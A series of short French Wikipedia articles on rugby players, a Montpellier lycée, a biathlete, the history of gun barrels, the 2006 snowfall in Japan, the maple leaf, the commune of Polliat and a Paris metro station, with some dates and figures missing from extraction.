En 1795, il est nommé président de l'assemblée du canton de Bray sur Somme. Destitué en 1797, il est réélu en 1798.
En 1799, il est nommé membre d'une commission chargée de lever 40.000 chevaux pour reconstituer la cavalerie, jusqu'en 1801.
Sous le Consulat, l'Empire et la première Restauration.
Sa carrière politique se poursuit désormais dans la Somme, où se situe son château de Suzanne.
Le 2 vendémiaire an XIV (24 septembre 1805), le Sénat conservateur l'élit député de la Somme au Corps législatif. 
Le , il est fait chevalier de l'Empire. En 1809, il est mis à la retraite comme lieutenant-général. 
Le , il est réélu député de la Somme par le Sénat conservateur. 
En avril 1814, il adhère à la déchéance de l'empereur, puis à la Restauration. 
Il s'exprime en ,en faveur de la restitution aux émigrés des biens nationaux non vendus .
Il reste député de la Somme durant la première Restauration, jusqu'en mars 1815 et se retire alors de la vie politique.
Mariage et descendance.
Il épouse à Paris le 30 avril 1776 Philiberte Renée de Galard Béarn (Livry sur Seine, 19 août 1753 - Paris, 13 septembre 1824), fille d'Anne Hilarion de Galard, comte de Béarn, premier écuyer de Madame Victoire, et d'Olympe de Caumont la Force. Dont :

</doc>
<doc id="568383" url="https://fr.wikipedia.org/wiki?curid=568383" title="Abdel Kechiche">
Abdel Kechiche



</doc>
<doc id="568384" url="https://fr.wikipedia.org/wiki?curid=568384" title="Max Barrau">
Max Barrau

Max Barrau, né le à Beaumont-de-Lomagne (France), est un joueur international français de rugby à XV, ayant évolué au poste de demi de mêlée. 
Son neveu Mathieu Barrau a également joué à Agen et en équipe de France, tandis que son petit-fils Maxence Biasotto remporte le Championnat du monde junior en 2023 avec l'équipe de France des moins de 20 ans. 
Biographie.
Max Barrau naît le à Beaumont-de-Lomagne, dans le département français du Tarn-et-Garonne.
Formé au Stade beaumontois, et international français avec son club d'origine, il émigre d'abord un an au Stade toulousain (saison 1972-1973), puis au SU Agen (saison 1973-1974) avant de revenir dans son club de Beaumont-de-Lomagne. Cette volte-face lui fit perdre sa place en équipe de France à cause de de licence rouge.
Cette affaire comme l'interdiction du rugby à XIII, ou encore le Bouclier de Brennus non attribuée au FC Grenoble en 1993, est considérée comme une des plus grandes injustices de l'histoire du rugby et un véritable gâchis pour l'équipe de France car beaucoup le considéraient comme le meilleur demi de mêlée français de l'époque (voire de la fin du vingtième siècle). Il est classé trois fois de suite meilleur demi de mêlée français entre 1971 et 1973 par l'hebdomadaire "Midi olympique". Après, il n'est plus sélectionné que dans des équipes de France B avant de renoncer à toute sélection.
En équipe de France, il est sélectionné pour la tournée en Afrique du Sud de 1971 mais se brise la jambe au cours du premier match contre la province de l'Eastern Transvaal et doit rentrer immédiatement en France. Il est en revanche de la tournée en Australie de 1972 où il dispute les deux test matchs. Son match « référence » est un test match remporté (13-9) en 1973 face aux "All Blacks", où il est époustouflant.
En 1974, il fait également partie de la tournée en Argentine. Il est par la suite supplanté par Richard Astre et Jacques Fouroux à cause de ses deux changements de clubs successifs, et notamment pour avoir quitté le SU Agen afin de revenir dans son club formateur pour raison familiale.
Durant sa carrière, il joue également pour la RS Mauvezin.
En dehors du rugby, il est mécanicien de profession puis attaché de direction dans la société familiale.
Famille.
Max Barrau a un frère cadet, Michel, qui pratique également le rugby à XV aux postes d'arrière et de demi d'ouverture, pour les clubs du SU Agen, du Stade beaumontois et de l'US Montauban. En 1974, il est remplaçant en équipe de France et est retenu pour la tournée de 1975 en Afrique du Sud mais doit déclarer forfait sur blessure.
Son neveu, Mathieu Barrau, est professionnel et joue également au SU Agen ainsi qu'en équipe de France.
Tandis que, son petit-fils, Maxence Biasotto est également un joueur professionnel de rugby à XV et champion du monde junior en 2023.

</doc>
<doc id="568388" url="https://fr.wikipedia.org/wiki?curid=568388" title="Corné van Moorsel">
Corné van Moorsel

Corné van Moorsel est un auteur de jeux de société
néerlandais.

</doc>
<doc id="568391" url="https://fr.wikipedia.org/wiki?curid=568391" title="Lycée Joffre">
Lycée Joffre

Le lycée Joffre (du nom du maréchal Joseph Joffre) est un établissement d'enseignement secondaire et supérieur situé à Montpellier, département de l'Hérault. Une ancienne place forte, la citadelle de Montpellier, abrite cet établissement, comprenant un collège, un lycée général et technologique et des classes préparatoires aux grandes écoles. De nos jours, il compte près de de la classe de sixième aux classes préparatoires.
Histoire.
Les origines du Grand Lycée de Montpellier peuvent être retracées jusqu'au , à travers son Collège royal. Il est lui-même l'héritier direct et le continuateur de la faculté des arts de l'université de Montpellier, fondée le par la bulle papale « » du pape Nicolas IV. C'est donc l'un des plus anciens lycées de France avec l'actuel Lycée Henri-IV de Béziers.
Le Grand Lycée impérial de Montpellier, futur Lycée Joffre, fut inauguré le et connut sa première rentrée le de cette même année. Il prenait ainsi la suite de l'ancien Collège Royal de Montpellier, fondé par les jésuites en 1629, et qui occupait les locaux de l'actuel musée Fabre. Plus tard, le Grand Lycée Impérial deviendra pendant un court laps de temps « Lycée de garçons de la ville de Montpellier ». En 1947, il est définitivement transféré dans la citadelle bâtie de 1624 à 1627 sous le règne de Louis XIII et il prendra, peu après, le nom de Lycée Joffre. Quant à la citadelle de Montpellier, elle est classée à l'inventaire des Monuments Historiques depuis le .
Le corps principal du bâtiment, bâti en pierre de taille avec couverture en ardoise, date des années 1880. À l'origine, il s'agissait de l'ancienne « caserne du Polygone » dont on peut remarquer le trophée d'armes et de drapeaux au sein du fronton central.
Localisation.
Le lycée Joffre est situé en centre-ville, près de la place de la Comédie, sur l'Esplanade, à côté du centre des congrès du Corum. La gare et le centre commercial «le Polygone » se trouvent également à proximité, de même que les grandes librairies et la médiathèque. Le lycée Joffre est également desservi par les bus de ville et le tramway des lignes 1, 2 et 4.
Enseignement.
L'enseignement secondaire.
L'établissement comprend le plus grand collège de Montpellier (d'environ 1200 élèves) dont l'entrée se situe sur l'allée Henri II de Montmorency, à l'est de la Citadelle. Les bâtiments du lycée occupent l'espace central, à proximité du collège mais entièrement séparés. Quant à ceux des classes préparatoires aux Grandes Écoles (internat compris), ils se situent au niveau de l'esplanade Charles de Gaulle (entrée principale nord), de chaque côté de l'allée des Droits de l'Homme.
Initiatives pédagogiques et technologiques.
Années 1970.
En 1974, dans un objectif novateur d'initiation à l'informatique des élèves et enseignants intéressés, le lycée Joffre, à Montpellier, a fait partie de l'opération ministérielle dite « Expérience des » : utilisation de logiciels et enseignement de la programmation en langage LSE, en club informatique de lycée, pour de l'enseignement secondaire. À cet effet, dans une première phase, quelques professeurs du lycée, enseignants de diverses matières et candidats, furent préalablement formés de manière lourde à la programmation informatique. Puis, dans une seconde phase, l'établissement fut doté d'un ensemble informatique en temps partagé comprenant : un mini-ordinateur français Télémécanique T1600 avec disque dur, un lecteur de disquettes , plusieurs terminaux écrans claviers , un téléimprimeur , et le langage LSE implémenté ; tous ces moyens ayant permis de mettre en œuvre sur le terrain cette démarche expérimentale, avec du matériel informatique ultra-moderne pour l'époque.
En 2013, une partie de cet équipement devenu obsolète a été sauvée de la destruction grâce à une démarche initiée par les professeurs d'informatique « » de l’établissement. Leur objectif était de préserver ce patrimoine technologique adossé à la genèse de l'enseignement de l'informatique, dans les lycées et collèges. Les deux éléments ont alors été versés à la Mission PATSTEC Languedoc-Roussillon, laquelle a fait classer l'ordinateur T1600 dans l'inventaire des Monuments Historiques. Ces matériels, témoins de la performance de l'informatique française des années 1970, étaient entreposés en juillet 2018 dans les réserves du PATSTEC, à l'Institut de botanique de l'Université de Montpellier.
Enseignements actuels.
Le collège, qui est totalement indépendant et de niveau très hétérogène, et le lycée proposent une section internationale espagnol dans laquelle sont dispensés des cours d'histoire et de littérature en langue espagnole. Le russe est proposé en langue vivante 1 dès le collège. Le collège et le lycée proposent aussi une option « échecs » qui a remporté scolaires et un championnat européen en 2004. Enfin, collège et lycée se partagent de nombreux équipements sportifs (les terrains de sport au Sud de la citadelle, la piscine et le grand gymnase).
Classement du lycée.
En 2015, le lycée se classe " sur 28" au niveau départemental quant à la qualité d'enseignement, et "" au niveau national. Le classement s'établit sur trois critères : le taux de réussite au bac, la proportion d'élèves de première qui obtient le baccalauréat en ayant fait les deux dernières années de leur scolarité dans l'établissement, et la "valeur ajoutée" (calculée à partir de l'origine sociale des élèves, de leur âge et de leurs résultats au diplôme national du brevet (diplôme obtenu avec quelques mentions).
Les classes préparatoires.
Le lycée Joffre abrite des CPGE littéraires (khâgnes A/L et LSH), économiques et commerciales (ECS), et scientifiques (MPSI, MP2I, PCSI, MP, MPI, PC, PSI et BCPST). Environ deux cents places d'internat (répartis pour moitié entre filles et garçons) sont à la disposition des étudiants en classes préparatoires.
Classements nationaux.
Le classement national des classes préparatoires aux grandes écoles (CPGE) se fait en fonction du taux d'admission des élèves dans les grandes écoles. 
En 2018, la revue mensuelle "L'Étudiant" donnait le classement suivant pour les concours de 2017 :
Bureau des élèves.
Les préparationnaires ont fondé une association « les Kalaux du Clapas » ou « les Khâlots du Clapas », aussi appelé « le Bural » ou « Très Vénérable Bural » (sous-entendu « bureau des élèves »). Elle s'occupe de la gestion du budget destiné à organiser des soirées diverses, parmi lesquelles le "Gala des Prépas de Joffre", ainsi que des commandes de khâlots. Le budget de l'association repose, entre autres, sur le bénéfice réalisé lors des commandes de khâlots et des ventes de tickets lors des soirées.

</doc>
<doc id="568392" url="https://fr.wikipedia.org/wiki?curid=568392" title="World Boxing Foundation">
World Boxing Foundation

La World Boxing Foundation (WBF) est une fédération de boxe anglaise professionnelle fondée en 1988 aux États-Unis sous le nom de World Boxing Federation et renommée ainsi en 2004 après le transfert de son siège en Australie. Considérée comme une organisation mineure comparée à la WBA, la WBC, l'IBF et la WBO, elle sert de tremplin à certains boxeurs pour disputer des titres plus prestigieux.

</doc>
<doc id="568396" url="https://fr.wikipedia.org/wiki?curid=568396" title="Équipe de France de football en 2002">
Équipe de France de football en 2002

Cet article traite de l'année 2002 de l'Équipe de France de football.
Les matches.
A : match amical. CM : match de la Coupe du monde 2002. QCE : match qualificatif pour l'Euro 2004

</doc>
<doc id="568397" url="https://fr.wikipedia.org/wiki?curid=568397" title="Viktor Maigurov">
Viktor Maigurov



</doc>
<doc id="568400" url="https://fr.wikipedia.org/wiki?curid=568400" title="Jean-Guillaume Bruguières">
Jean-Guillaume Bruguières



</doc>
<doc id="568402" url="https://fr.wikipedia.org/wiki?curid=568402" title="Viktor Maïgourov">
Viktor Maïgourov

Viktor Viktorovich Maïgourov (en russe : Виктор Викторович Майгуров), né le à Sverdlovsk, est un biathlète russe. Il est champion du monde de la poursuite en 1997. Son palmarès comprend aussi deux médailles de bronze olympiques dont une en individuel en 2002.
Dans la Coupe du monde, il remporte huit épreuves individuelles et deux petits globes de cristal de spécialité, en 1997 et 2002.
Biographie.
Il commence sa carrière sous les couleurs de l'Union soviétique. Lors de la saison 1992-1993, il effectue sa première saison complète dans la Coupe du monde sous les couleurs biélorusses, montant sur son premier podium en relais à Östersund et obtenant une dixième place à Lillehammer comme meilleur résultat. Il se retrouve rapidement en haut de l'affiche lors de l'hiver suivant, s'imposant au sprint de Pokljuka. Il participe ensuite aux Jeux olympiques de Lillehammer, où il est notamment quatrième du relais. Il rejoint ensuite l'équipe Russe pour gagner sa deuxième étape de Coupe du monde aussi à Lillehammer en 1995. En 1996, à la faveur de plusieurs podiums, il atteint la deuxième place du classement général de la Coupe du monde derrière son compatriote Vladimir Dratchev et obtient deux médailles aux Championnats du monde à Ruhpolding, dont celle d'argent au sprint et d'or au relais. En 1997, il effectue une saison riche en résultats également, récoltant quatre succès individuels, dont le titre de champion du monde de la poursuite en battant son compatriote Sergey Tarasov avec un sans faute au tir. Il est récompensé par le petit globe de cristal de cette discipline, finissant en tête de la Coupe du monde de la spécialité nouvellement créée. Aux Jeux olympiques d'hiver de 1998, il échoue au pied du podium sur le sprint (quatrième), mais prend la médaille de bronze sur le relais avec Pavel Mouslimov, Vladimir Dratchev et Sergey Tarasov.
En 1999, il finit l'hiver sans podium individuel, mais décroche la médaille d'argent du relais aux Championnats du monde.

</doc>
<doc id="568403" url="https://fr.wikipedia.org/wiki?curid=568403" title="Christian Bélascain">
Christian Bélascain

Christian Bélascain, né le à Biarritz (France) et mort le à Bayonne (France), est un joueur international français de rugby à XV évoluant au poste de centre au Boucau stade, à l'Aviron bayonnais et à l'US Bardos.
Biographie.
Christian Bélascain naît le à Biarritz dans le département français des Basses-Pyrénées.
Par la suite, il signe à l'Aviron bayonnais en 1976, club avec lequel il remporte le Challenge Yves du Manoir en 1980 puis est finaliste du Championnat de France 1981-1982.
Il dispute son premier test match avec l'équipe de France le , contre la Roumanie, et son dernier face au pays de Galles, le .
Le , il joue avec les Barbarians français contre la Nouvelle-Zélande à Bayonne. Les "Baa-Baas" s'inclinent 18 à 28.
Il termine sa carrière de joueur à l'US Bardos.
Christian Bélascain devient ensuite moniteur d'éducation physique, puis entraîneur de l'Aviron bayonnais et manager de l'Aviron bayonnais.
Il meurt le à Bayonne, à 50 ans des suites d'une rupture d'anévrisme.
Dans les années 2000, un terrain à son nom est inauguré à Bayonne pour lui rendre hommage (ex-terrain des Remparts). Le Championnat de France des moins de 21 ans réservé aux clubs non professionnels (ex Reichel B) porte son nom.

</doc>
<doc id="568404" url="https://fr.wikipedia.org/wiki?curid=568404" title="Canon (arme à feu)">
Canon (arme à feu)

Le canon est la partie d'une arme à feu constituée par le tube servant à lancer un projectile.
Il existe des canons lisses et rayés. Dans ces derniers, en réalisant des rainures à l'intérieur du canon, on réduit la vitesse (et donc la portée) du projectile mais on accroît la précision.
La vitesse à la bouche exprime la vélocité du projectile à sa sortie du canon, et l'énergie à la bouche son énergie cinétique.
L'écouvillon est une brosse servant à nettoyer l'intérieur du canon.
Histoire.
Les canons, ont été inventés, comme la poudre à canon, en Chine, les premiers modèles étaient, à la fin de la dynastie Tang (618-907), des tubes de bambou, servent à lancer des « lances de feu ». la civilisation chinoise crée ensuite les premiers canons métalliques en utilisant la fonte, leur permettant de réaliser les premiers canons d'infanterie et armes à feu à main.
En occident, les premières « bouches à feu » furent faites en fer forgé. Elles étaient composées de barres de fer soudées et assemblées en forme de douves et reliées par des cercles de même métal. En 1354, il y avait déjà des pièces en cuivre. En 1372, on coulait des pièces de bronze à Augsbourg. Vers la fin du , ces pièces étaient très nombreuses en Italie. On employa le fer forgé concurremment avec le bronze pendant environ deux siècles et demi. La production de pièces de bronze ou de cuivre témoigne d'une maîtrise de la technologie des fours à réverbère. Les premiers alliages de bronze comprenaient non seulement de l'étain et du cuivre, mais aussi de faibles quantités de zinc et de plomb. Cependant, cette composition fut rapidement affinée pour se composer principalement de cuivre et d'étain.
À partir du milieu du , l'artillerie fait de rapides progrès surtout au point de vue de la mobilité des pièces et de la rapidité du tir. Les frères Bureau font partie d'une pléiade d'officiers illustres qui ont contribué à rendre l'artillerie française la première d'Europe depuis les guerres de Charles VIII en Italie. Les nouveaux canons contribuent à faire reconquérir en une seule année (1449) la Normandie sur les Anglais. Il y a une rapide évolution dans la fonderie des canons en bronze, en laiton et plus rarement, en fer. Il arrive souvent aux canons d'exploser. Pendant le siège de Cherbourg, on célèbre le fait que quatre canons seulement aient éclaté. Les couleuvrines se développent.
La coulée de canons en fonte fut réalisée dès 1547 en Angleterre. La coulée de pièce de gros calibre exigeait le concours de plusieurs hauts fourneaux. Dans le principe les pièces étaient coulées à noyau et on ne les alésait même pas. On voit qu'en 1671, les pièces étaient encore coulées à noyau, mais avec masselottes et qu'elles étaient alésées. L'alésage se faisait autrefois verticalement. En 1744, Jean Maritz, inspecteur général de la fonderie de la marine en France, imagina de couler les bouches à feu pleines et de les forer horizontalement en les faisant tourner autour de leur axe. En 1748, ces procédés devinrent réglementaires en France.
En Angleterre, on substitua dès 1712 le charbon minéral au charbon de bois dans la fabrication de la fonte. Les premiers essais ne furent pas heureux et l'entreprise fut abandonnée. Cependant, on revint au procédé et, en 1740, on utilisait de la fonte au coke. Les machines à vapeur, qui furent inventées peu de temps après, mirent de grandes forces motrices à la disposition de l'industrie et permirent l'établissement de hauts fourneaux de grandes dimensions. De 1760 à 1766, l'emploi de coke dans la réduction des minerais de fer devint général en Angleterre. C'est aussi vers la même époque que l'on commença dans ce pays à fabriquer les pièces avec de la fonte au coke, mais toujours par le coulage direct au haut fourneau. Les canons en fer furent coulés en seconde fusion par le four à réverbère chauffé à la houille à partir de 1770 à 1775, en Angleterre et de 1780 à 1790, en France et en Belgique
Au , si les armes blanches et fusils sont le travail d'artisans, les canons, boulets et mortiers s'accommodent moins du travail artisanal et se font dans les ateliers attenant aux usines sidérurgiques. L'usage de canons est déterminant dans les combats sur mer mais ne l'est pas encore dans les combats sur terre. La production de canons est souvent une activité marginale dans la production de certaines usines, même si on compte de plus en plus d'usines destinées à la production d'armes.
Dans le courant du , la production de canons en acier, mais aussi la production de blindages pour les coques de bateau qui doivent résister à l'impact produit par les obus de ces mêmes canons, contribue à parts égales avec celle des rails et locomotives au renouvellement des techniques liées à l'acier. Le procédé Bessemer notamment permet d’accroître la ténacité de même que la résistance à l'éclatement des aciers employés pour les canons et, d'autre part, d'en amoindrir le poids. En outre, les canons fabriqués dans cet acier ductile peuvent être moulés en une seule pièce et à des cadences plus importantes que le fer forgé.
La production de canons fait la prospérité de l'entreprise Krupp en Allemagne, à partir de 1859. À Essen, les deux cinquièmes de l'acier fondu qui sortent des usines Krupp sont destinés à la fabrication de canons de tous calibres, depuis la petite pièce de campagne de quatre (boulets pesant de fer soit un peu moins de ) jusqu'à des pièces monstrueuses tirant des projectiles de 100, 150 voire . Krupp équipe en canons les Russes, les Anglais, les Belges, les Italiens, les Turcs, les Autrichiens, les Hollandais, et même les Japonais». La bataille de Sedan, le , consacre la supériorité des canons en acier Krupp, qui se chargent par la culasse, dans les rangs de l'armée prussienne, sur les canons en bronze de l'armée française qui eux se chargent par la gueule. Si les portées des canons sont identiques, la cadence de tir des canons prussiens est infernale. La vente de canons sera pour l'Allemagne l'un des moteurs de son expansion, et plus tard de son hégémonie sur le monde.
La révolution industrielle, entamée à la fin du , accouche de sa première guerre industrielle, à savoir la Première Guerre mondiale. La France, qui n'avait que au début de la guerre, en possède en 1918 et a tiré d'obus. La Grosse Bertha allemande, tirant des obus de , est à elle seule un condensé de prouesse technologique.
Fabrication.
Acier de Damas : Ce procédé a été utilisé pour forger des canons de fusil. Au début du , de nombreuses forges de la région liégeoise utilisaient encore ce procédé.

</doc>
<doc id="568406" url="https://fr.wikipedia.org/wiki?curid=568406" title="Chutes de neige au Japon en 2006">
Chutes de neige au Japon en 2006

L’hiver 2005-2006 au Japon est marqué par des précipitations neigeuses particulièrement abondantes.
Météorologie.
Le Japon dispose d'une moyenne sur tout le pays de 2,45 mètres de hauteur de neige sur la période allant du 9 décembre au 5 janvier, soit trois fois plus que la moyenne des dix années précédentes. Le froid bat également des records, avec des températures jamais enregistrées depuis 1946.
Les températures extrêmes sont dues à la fonte des glaces de mer en Arctique.
Conséquences.
Le 7 janvier, l'agence de presse Kyodo rapporte que depuis le début de l'hiver (début décembre), 61 personnes sont mortes, ont été blessées à cause du froid et de la neige et environ 600 habitations ont été endommagées.
Les transports sont également touchés : certaines lignes de chemin de fer et certaines routes sont fermées, comme dans les préfectures de Niigata et d'Akita. Des accidents ont même eu lieu, comme le déraillement d'un train express à la suite d'une tempête de neige le 25 décembre, causant la mort de 5 personnes et en blessant 32 autres.
L'approvisionnement en électricité a aussi connu des problèmes et 1,4 million de foyers en ont souffert depuis début décembre.
Pour déblayer les routes et les toits des habitations (recouvertes pour certaines par plus de deux mètres de neige), le gouvernement a demandé à l'armée de terre d'intervenir, conformément aux souhaits des autorités locales.

</doc>
<doc id="568407" url="https://fr.wikipedia.org/wiki?curid=568407" title="Grades militaires">
Grades militaires



</doc>
<doc id="568408" url="https://fr.wikipedia.org/wiki?curid=568408" title="Feuille d'érable">
Feuille d'érable

La feuille d'érable est l'un des emblèmes officiels du Canada, au même titre que le castor canadensis.
Symbole du Canada.
On retrouve la feuille d'érable notamment sur le drapeau du Canada (ce n’est qu’en 1965 qu'elle constitue le centre du drapeau) ainsi que sur plusieurs grades militaires des forces armées canadiennes.
Sur le drapeau, la feuille d'érable rouge, au dessin stylisé, comporte 11 pointes.
Son utilisation est due à la grande présence des érables en sol canadien. L’érable constitue depuis toujours une ressource économique d’envergure au Canada. En plus de fournir une grande quantité de bois, le sucre d’érable recueilli chaque année participe à l’exportation des ressources du pays.
La chanson folklorique « La Feuille d'Érable » des éditions La Bonne Chanson, raconte l'histoire de l'apparition des emblèmes floraux de nombreux pays, y compris pour la feuille d'érable canadienne. Cette chanson est la marche officielle du Cadre des Instructeurs de Cadets.
Le terme anglais "Maple Leaf" est également couramment utilisé. C'est notamment le nom de plusieurs équipes sportives, comme l'équipe de hockey sur glace : les "Maple Leafs de Toronto".
Monnaie canadienne.
Entre 1876 et 1901, toutes les pièces de monnaie canadienne portaient sur leur design une ou plusieurs feuilles d’érable sous forme de couronne. Aujourd’hui, seules les pièces de 5 cents conservent ce symbole reconnu internationalement. D’ailleurs, depuis 1937, le revers de la pièce de 1 cent canadien, dessiné par G.E. Kruger-Gray (K.G.), n’a presque pas changé. L'année 2012 est la dernière où la pièce de 1 cent a été frappée par la Monnaie royale canadienne, la pièce de 1 cent ayant été retirée à compter de l'automne 2012 . La configuration des deux feuilles alternes sur la tige gravées sur la pièce de 1 cent indique qu'il ne s'agit pas de l’érable ("Acer") mais du platane ("Platanus" spp.), l'érable porte des feuilles opposées, non alternes.
À partir de 1979, la Monnaie royale canadienne frappe la Feuille d'érable en or, la pièce d'or officielle du Canada.

</doc>
<doc id="568414" url="https://fr.wikipedia.org/wiki?curid=568414" title="Polliat">
Polliat

Polliat (prononciation ) est une commune française située dans le département de l'Ain, près de la région naturelle de la Dombes. Elle appartient à l'arrondissement de Bourg-en-Bresse.
Les habitants de Polliat sont les "Polliatis".
Géographie.
Localisation.
Polliat est une commune française du département de l'Ain dans le sud de la région naturelle de la Bresse, près de la région naturelle de la Dombes. Elle se situe à à l'ouest de Bourg-en-Bresse, à à l'est de Mâcon, à au nord de Lyon et à au sud de Paris.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat semi-continental et le climat de montagne et est dans la région climatique Bourgogne, vallée de la Saône, caractérisée par un bon ensoleillement (), un été chaud (), un air sec au printemps et en été et des vents faibles. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Ceyzériat à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Voies de communication et transports.
La proximité de la commune avec la ville de Bourg-en-Bresse mais aussi avec Mâcon lui confère l'avantage d'être traversé et d'être à proximité d'axes de communication importants au niveau départemental, régional et national.
Voies ferroviaires.
La commune est traversée par la ligne de Mâcon à Ambérieu. La Gare de Polliat est desservie par des trains TER Rhône-Alpes qui circulent sur la ligne 23, Mâcon - Bourg-en-Bresse - Ambérieu.
Pour rejoindre les grandes villes en train, il faut passer par Bourg-en-Bresse ou par Mâcon qui sont reliées aux grandes lignes.
Transports en commun.
La commune est reliée au réseau départemental des bus car.ain.fr. Il ne dessert qu'un seul arrêt au bourg qui se nomme "Centre". Puisque la commune accueille une gare qui est reliée au réseau TER, Polliat possède un arrêt de bus "Mairie" reliée à la ligne 30.
De plus, la commune est aussi reliée au réseau de transport Rubis par le biais des lignes 51, 52 et 53 qui permettent de rejoindre la gare de Bourg-en-Bresse, le carré Amiot et les lycées de la préfecture.
Urbanisme.
Typologie.
Au , Polliat est catégorisée bourg rural, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Polliat, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Bourg-en-Bresse, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (74,8 % en 2018), en diminution par rapport à 1990 (78,1 %). La répartition détaillée en 2018 est la suivante : 
terres arables (33,6 %), zones agricoles hétérogènes (28,3 %), forêts (14,3 %), prairies (12,9 %), zones urbanisées (10,9 %).
L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Origine du nom.
Polliat vient de "Polliacum" ou de "Pulliacum" qui est le nom d'ancien domaine d'origine gallo-romaine.
Anciens noms.
La première mention du village date de 1250 dans le pouillé de Lyon sous le nom de "Poilies". Quinze années plus tard, "Poillia" est mentionné dans les archives de la Côte-d'Or. Dans les titres de Laumusse, on trouve le nom de "Poilliacus" en 1286.
Vers 1350, le pouillé de Lyon évoquent "Pollia" et les archives de la Côte-d'Or citent "Polia" en 1378. On utilise "Poilliaz" pour se référer à la commune vers 1410 selon le terrier de Saint-Martin. En 1417, on retrouve une mention du village dans les archives de la Côte-d'Or, le nom cité est "Polliacus".
Le Documentaire linguistique de l'Ain mentionne "Pollie" vers 1465 et le terrier des Chabeu cite "Polliaz" en 1490. Le siècle suivant, en 1558, le nom de la commune devient "Polliac" si l'on se réfère aux archives du Rhône. Le nom actuel de "Polliat "apparaît pour la première fois en 1656 dans les visites pastorales Polliat. Toutefois, on trouve le nom de "Polliat sur Veyle" au selon les sources de Cassini.
Histoire.
En 1601, après la fin de la guerre franco-savoyarde qui se termine par le traité de Lyon, Polliat appartient à la France avec l'acquisition de celle-ci de la Bresse, du Bugey, du Valromey et du pays de Gex. Elle est par la suite intégrée à la province bourguignonne.
Entre 1790 et 1795, la commune était une municipalité du canton de Bourg, et dépendait du district de Bourg.
Le , a lieu la mise en service de la ligne de chemin de fer entre Mâcon et Bourg-en-Bresse, par la Compagnie des chemins de fer de Paris à Lyon et à la Méditerranée (PLM). Cette ligne traverse la commune et dessert la gare de Polliat.
Politique et administration.
Administration municipale.
Le conseil municipal comprend dix-neuf membres, dont le maire, cinq adjoints et treize autres conseillers municipaux.
Population et société.
Enseignement.
La commune possède une école maternelle et une école élémentaire répartis sur deux sites différents. L'école maternelle possède trois classes tandis que l'école élémentaire en possède six.
Les élèves du village passant en 6 sont dirigés au "collège de Brou" de Bourg-en-Bresse.
Sports.
Entre les routes D 1079 et D 67, les équipements sportifs sont regroupés en un lieu. On y trouve un complexe sportif, deux terrains de football et trois courts de tennis. Ces équipements peuvent être utilisés par les clubs de la commune.
Le Football Club Bressans est un club de football dont le siège est situé dans la commune réunissant les jeunes de Polliat avec ceux de Vandeins, Montcet, Montracol et Buellas. En effet, le club résulte de la fusion entre les clubs de l'AS Polliat, de l'ES Buellas-Corgenon et de l'ES Montcet-Vandeins-Montracol.
Les courts de tennis sont occupés par le Tennis club de Polliat, un club créé en 1985. On trouve aussi un club de judo avec le Judo club de Polliat qui propose d'autres activités comme le jujitsu, l'aïkido et la taïso-musuculation. Pour les amateurs de sport de boules, la Boule fraternelle créé le permet la pratique de ce sport.
La Gym Volontaire Polliat permet la pratique de plusieurs activités telles que la gym, la gym douce, la gym cardio et le yoga. En 2006 naît la Section Full Contact de Polliat rattachée au Judo club mais devient un club à part entière en 2011 qui prend le nom de Fighters Attitudes. Enfin, depuis 1995, l'Africa Danse permet de faire découvrir les danses du continent africain.
Culture et patrimoine.
Gastronomie.
Les spécialités culinaires sont celles de la région bressane, c'est-à-dire la volaille de Bresse, les gaudes, la galette bressane, les gaufres bressanes, la fondue bressane.
La commune se situe dans l'aire géographique de l'AOC Crème et beurre de Bresse et de l'AOC Volailles de Bresse.
Elle a aussi l'autorisation de produire le vin IGP Coteaux de l'Ain (sous les trois couleurs, rouge, blanc et rosé).
Espaces verts et fleurissement.
En 2014, la commune obtient le niveau « une fleur » au concours des villes et villages fleuris.

</doc>
<doc id="568415" url="https://fr.wikipedia.org/wiki?curid=568415" title="Cynoglossum cheirifolium">
Cynoglossum cheirifolium



</doc>
<doc id="568416" url="https://fr.wikipedia.org/wiki?curid=568416" title="Porte de Clichy (métro de Paris)">
Porte de Clichy (métro de Paris)

Porte de Clichy est une station des lignes 13 et 14 du métro de Paris, située dans le de Paris.
Comme la station "Porte des Lilas", elle se trouve à l'une des portes de Paris dont la desserte est assurée par deux lignes de métro distinctes.
Histoire.
La station est ouverte le , en tant que terminus de la branche nord-ouest de la (actuelle ligne 13) de la Société du chemin de fer électrique souterrain Nord-Sud de Paris (dite Nord-Sud). Elle est desservie par un train sur deux seulement, l'autre moitié se dirigeant vers "Porte de Saint-Ouen". De manière inhabituelle pour le Nord-Sud, la station est établie sur une boucle de retournement afin d'éviter le collecteur de Clichy.
